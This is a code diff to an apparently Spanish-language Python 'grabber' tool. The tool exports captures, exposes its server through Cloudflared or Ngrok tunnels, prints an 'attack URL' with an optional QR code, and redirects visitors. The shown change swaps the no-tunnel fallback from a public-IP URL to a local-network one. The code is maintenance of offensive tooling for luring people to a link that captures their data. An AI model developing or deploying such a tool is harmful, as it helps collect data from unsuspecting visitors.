@@ -1203,6 +1203,17 @@ def export_captures(rows, fmt='csv'):
         print(f"\n{Fore.RED}[!] Error al exportar: {e}{Style.RESET_ALL}")
     input(f"{Fore.GREEN}Presiona ENTER para volver...{Style.RESET_ALL}")
 
+def _get_local_ip():
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
 def run_grabber():
     if not grabber_options_menu():
         return
@@ -1222,12 +1233,10 @@ def run_grabber():
     t.daemon = True
     t.start()
 
-    public_ip = grabber.get_public_ip()
-    
     url = None
     proc = None
     tunnel_type = ""
-    
+
     if CONFIG['tunnel_choice'] == 1:
         spinner("Verificando Cloudflared...", 1)
         if not get_cloudflared_path():
@@ -1244,12 +1253,12 @@ def run_grabber():
             spinner("Iniciando túnel Ngrok...", 2)
             url, proc = start_ngrok_tunnel(grabber.port)
             tunnel_type = "Ngrok"
-    
+
     clear_screen()
     print_logo()
     print(f"{Fore.GREEN}[+] Servidor Local: {Style.RESET_ALL}http://localhost:{grabber.port}")
     print(f"{Fore.GREEN}[+] Redirección:    {Style.RESET_ALL}{CONFIG['redirect_url']}")
-    
+
     if url:
         print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
         print(f"{Fore.GREEN}URL DE ATAQUE ({tunnel_type}):{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}{url}{Style.RESET_ALL}")
@@ -1257,8 +1266,9 @@ def run_grabber():
         if CONFIG['generate_qr']:
             generate_qr_terminal(url)
     else:
-        url = f"http://{public_ip}:{grabber.port}"
-        print(f"\n{Fore.YELLOW}URL directa (requiere puertos abiertos): {url}{Style.RESET_ALL}\n")
+        local_ip = _get_local_ip()
+        url = f"http://{local_ip}:{grabber.port}"
+        print(f"\n{Fore.YELLOW}URL local (solo red local): {url}{Style.RESET_ALL}\n")
         if CONFIG['generate_qr']:
             generate_qr_terminal(url)
             
